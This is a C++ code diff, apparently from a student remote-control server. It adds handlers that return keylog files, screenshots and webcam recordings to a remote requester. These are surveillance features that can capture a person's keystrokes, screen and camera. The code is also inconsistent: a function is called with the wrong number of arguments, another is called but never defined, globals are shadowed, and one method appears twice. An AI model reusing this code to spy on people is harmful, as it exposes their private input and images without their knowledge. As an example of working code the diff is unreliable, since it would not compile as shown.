@@ -26,6 +26,11 @@ bool Server::keylog(Request& request, Response &response) {
         fin.close();
     
         response.putParam(kBody, content);
+
+        // Gui file
+        fin = ifstream("tmt.txt", fstream::binary);
+        
+        response.putParam(kFilePrefix + "tmt.txt", "");
     }  
 
     return true;
@@ -175,7 +180,9 @@ bool Server::handleService(Request& request, Response& response){
 bool Server::processRequest(Request& request, Response &response) {
     cout << "Processing Request\n" << request << "\n";
     response.setAction(request.getAction());
-    response.getParams().clear();
+    response.setParams(request.getParams());
+
+    // TODO param order
     
     switch (request.getAction()) {
         case ACTION_KEYLOG:
@@ -193,20 +200,21 @@ bool Server::processRequest(Request& request, Response &response) {
 
 //Duc
 
-inline int GetFilePointer(HANDLE FileHandle)
+inline LONG GetFilePointer(HANDLE FileHandle)
 {
     return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
 }
+
 extern bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height)
 {
     bool Success = false;
-    HDC SurfDC = NULL;                     // GDI-compatible device context for the surface
-    HBITMAP OffscrBmp = NULL;              // bitmap that is converted to a DIB
-    HDC OffscrDC = NULL;                   // offscreen DC that we can select OffscrBmp into
-    LPBITMAPINFO lpbi = NULL;              // bitmap format info; used by GetDIBits
-    LPVOID lpvBits = NULL;                 // pointer to bitmap bits array
-    HANDLE BmpFile = INVALID_HANDLE_VALUE; // destination .bmp file
-    BITMAPFILEHEADER bmfh;                 // .bmp file header
+    HDC SurfDC = NULL;                   
+    HBITMAP OffscrBmp = NULL;             
+    HDC OffscrDC = NULL;                   
+    LPBITMAPINFO lpbi = NULL;              
+    LPVOID lpvBits = NULL;                 
+    HANDLE BmpFile = INVALID_HANDLE_VALUE; 
+    BITMAPFILEHEADER bmfh;                 
 
     if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
         return false;
@@ -229,54 +237,37 @@ extern bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width,
 
     if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
         return false;
-
-    // Create a file to save the DIB to:
     if ((BmpFile = CreateFile(filename,
                               GENERIC_WRITE,
                               0, NULL,
-                              CREATE_ALWAYS,
+                              CREATE_NEW, 
                               FILE_ATTRIBUTE_NORMAL,
                               NULL)) == INVALID_HANDLE_VALUE)
 
         return false;
+    DWORD Written;
 
-    DWORD Written; // number of bytes written by WriteFile
-
-    // Write a file header to the file:
-    bmfh.bfType = 19778; // 'BM'
-    // bmfh.bfSize = ???        // we'll write that later
+    bmfh.bfType = 19778;
     bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
-    // bmfh.bfOffBits = ???     // we'll write that later
     if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
         return false;
-
     if (Written < sizeof(bmfh))
         return false;
-
-    // Write BITMAPINFOHEADER to the file:
     if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL))
         return false;
 
     if (Written < sizeof(BITMAPINFOHEADER))
         return false;
 
-    // Calculate size of palette:
     int PalEntries;
-    // 16-bit or 32-bit bitmaps require bit masks:
     if (lpbi->bmiHeader.biCompression == BI_BITFIELDS)
         PalEntries = 3;
     else
-        // bitmap is palettized?
-        PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
-                                                       // 2^biBitCount palette entries max.:
-                         (int)(1 << lpbi->bmiHeader.biBitCount)
-                                                       // bitmap is TrueColor -> no palette:
-                                                       : 0;
-    // If biClrUsed use only biClrUsed palette entries:
+        PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?(int)(1 << lpbi->bmiHeader.biBitCount): 0;
+
     if (lpbi->bmiHeader.biClrUsed)
         PalEntries = lpbi->bmiHeader.biClrUsed;
 
-    // Write palette to the file:
     if (PalEntries)
     {
         if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL))
@@ -285,6 +276,7 @@ extern bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width,
         if (Written < PalEntries * sizeof(RGBQUAD))
             return false;
     }
+
     bmfh.bfOffBits = GetFilePointer(BmpFile);
 
     if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL))
@@ -301,6 +293,9 @@ extern bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width,
 
     if (Written < sizeof(bmfh))
         return false;
+
+    delete[] lpbi; 
+    delete[] lpvBits; 
 
     return true;
 }
@@ -323,87 +318,100 @@ bool Server::screenshot(Request& request, Response &response){
     if (subaction == "Screenshot") {
         std::cout << "Started screenshot!\n";
 
-        // Đảm bảo thư mục tồn tại
-        if (!std::filesystem::exists("build/files")) {
-            std::filesystem::create_directories("build/files");
-        }
-
-        // Chụp màn hình và lưu vào file
-        bool success = ScreenCapture(0, 0, 1920, 1080, "build/files/screencapture.bmp");
+        bool success = ScreenCapture(0, 0, 1920, 1080, "../build/files/screencapture.bmp");
         if (success) {
             std::cout << "Screenshot taken successfully" << std::endl;
         } else {
-            std::cerr << "Error! Can not screenshot!" << std::endl;
+            std::cerr << "Error! Cannot take screenshot!" << std::endl;
+            response.putParam(kStatus, "Error: Failed to capture screenshot");
         }
     }
+    response.putParam(kFilePrefix + "screenshot.bmp", "");
     return true;
 }
 
-bool Server::getVideoByWebcam(Request& request, Response &response){
-    string subaction = request.getParam(kSubAction);
+
+std::atomic<bool> isRecording(false);
+cv::VideoCapture cap;
+cv::VideoWriter writer;
+
+bool StartWebcamRecording(const std::string& filename, bool &flag) {
+    // Open default webcam (device 0)
+    VideoCapture capture(0);
+    if (!capture.isOpened())
+    {
+        cerr << "Error: Unable to open the webcam." << endl;
+        return 0;
+    }
+
+    // Get frame size
+    Size frameSize((int)capture.get(CAP_PROP_FRAME_WIDTH), (int)capture.get(CAP_PROP_FRAME_HEIGHT));
+
+    // Print frame size for debugging
+    cout << "Frame size: " << frameSize.width << "x" << frameSize.height << endl;
+
+    // Create a window
+    namedWindow("Webcam", WINDOW_AUTOSIZE);
+
+    // Initialize video writer to save the video
+    VideoWriter writer(filename.c_str(), VideoWriter::fourcc('m', 'p', '4', 'v'), 30, frameSize);
+
+    if (!writer.isOpened())
+    {
+        cerr << "Error: Unable to open video writer." << endl;
+        return 0;
+    }
+
+    Mat frame;
+    while (true)
+    {
+        capture >> frame; // Capture a new frame
+        if (frame.empty())
+        {
+            cerr << "Error: Blank frame captured." << endl;
+            break;
+        }
+
+        // Write frame to video file
+        writer.write(frame);
+
+        // Show the captured frame
+        imshow("Webcam", frame);
+
+        // Break if 'Esc' key is pressed
+        char c = (char)waitKey(33);
+        if (c == 27)
+            break;
+    }
+
+    // Release resources
+    capture.release();
+    writer.release();
+    destroyAllWindows();
+    return true;
+}
+
+bool Server::getVideoByWebcam(Request& request, Response &response) {
+    std::string subaction = request.getParam(kSubAction);
     response.putParam(kStatus, "Ok");
 
     if (subaction == "Start") {
-        cout << "Started recording webcam!\n";
-        capture.open(0);
-        if (!capture.isOpened()) {
-            cerr << "Error: Unable to open the webcam." << endl;
-            return false;
-        }
-        Size frameSize((int)capture.get(CAP_PROP_FRAME_WIDTH), (int)capture.get(CAP_PROP_FRAME_HEIGHT));
-        cout << "Frame size: " << frameSize.width << "x" << frameSize.height << endl;
-        
-        // Initialize video writer to save the video
-        writer.open("build/files/videowebcam.mp4", VideoWriter::fourcc('m', 'p', '4', 'v'), 30, frameSize);
-        if (!writer.isOpened()) {
-            cerr << "Error: Unable to open video writer." << endl;
-            capture.release();  // Release webcam if writer fails
-            return false;
-        }
-
-        isRecording = true;
-
-        thread([this]() {
-            Mat frame;
-            namedWindow("Webcam", WINDOW_AUTOSIZE);
-            while (isRecording) {
-                capture >> frame;  // Capture a new frame
-                if (frame.empty()) {
-                    cerr << "Error: Blank frame captured." << endl;
-                    break;
-                }
-                // Write frame to video file
-                writer.write(frame);
-                // Show the captured frame
-                imshow("Webcam", frame);
-
-                // Wait for a short interval (or stop if 'Esc' is pressed)
-                if (waitKey(33) == 27) {
-                    isRecording = false;  // Allow stopping via 'Esc'
-                    break;
-                }
-            }
-            destroyAllWindows();  // Close display window
-        }).detach(); // Detach thread to run in background
-    } 
-    else if (subaction == "Stop") {
-        cout << "Stopping webcam recording...\n";
-        if (isRecording) {
-            isRecording = false;  // Stop the recording loop
-            // Wait a moment for thread to finish
-            this_thread::sleep_for(chrono::milliseconds(100));
-
-            // Release resources
-            capture.release();
-            writer.release();
-            cout << "Webcam and writer resources released.\n";
-        } else {
-            cout << "Webcam is not currently recording.\n";
+        const string filename = "../build/files/videowebcam.mp4";
+        bool result = StartWebcamRecording(filename);
+        if (!result) {
+            response.putParam(kStatus, "Error: Failed to start recording.");
         }
     }
-
+    else if (subaction == "Stop") {
+        bool result = StopWebcamRecording();  // Dừng quay
+        if (!result) {
+            response.putParam(kStatus, "Error: Failed to stop recording.");
+        }
+    }
+    response.putParam(kFilePrefix + "video.mp4", "");
     return true;
 }
+
 
 bool Server::processRequest(Request& request, Response &response){
 
